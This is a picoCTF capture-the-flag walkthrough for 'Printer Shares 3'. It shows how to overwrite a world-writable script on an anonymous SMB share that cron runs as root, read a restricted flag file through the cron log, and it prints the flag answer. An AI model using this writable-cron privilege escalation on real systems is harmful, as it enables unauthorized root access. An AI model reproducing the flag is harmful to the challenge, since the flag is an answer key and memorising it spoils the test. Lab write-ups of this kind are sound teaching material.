# PRINTER SHARES 3 PROBLEM GUIDE:

*(General Skills — Medium, 300pt)*

## HINTS:
Hint 1: A world-writable `script.sh` in the public share is run by cron as root.

## TOOLS:
`$ smbclient //<host>/shares -p <port> -N` (`get` / `put`)

## WALKTHROUGH:
1. `$ smbclient -L //dolphin-cove.picoctf.net/ -p <port> -N` -> `shares` (public) and `secure-shares` (restricted).

2. In `shares`: `script.sh` and `cron.log`. `cron.log` grows every minute and `script.sh` is `echo "Health Check: $(date)"` — a cron job runs this writable script as root.

3. Overwrite `script.sh` to locate the flag, then `put` it back:
```bash
#!/bin/bash
find / -name "*flag*" 2>/dev/null
```
    - `smb: \> put script.sh`, wait a minute, `get cron.log` -> reveals `/challenge/secure-shares/flag.txt`

4. Change `script.sh` to `cat /challenge/secure-shares/flag.txt`, `put`, wait a minute, `get cron.log`:
    - Answer: `picoCTF{5mb_pr1nter_5h4re5_r3v3r53_0eb29140}`

## NOTES:
- External SMB can't read `secure-shares`, but the cron daemon runs the script *from inside* as root — so you use root's cron to read it for you.
- A writable script executed by a privileged scheduler is a classic privesc. Builds on [[printer-shares]] and [[printer-shares-2]].
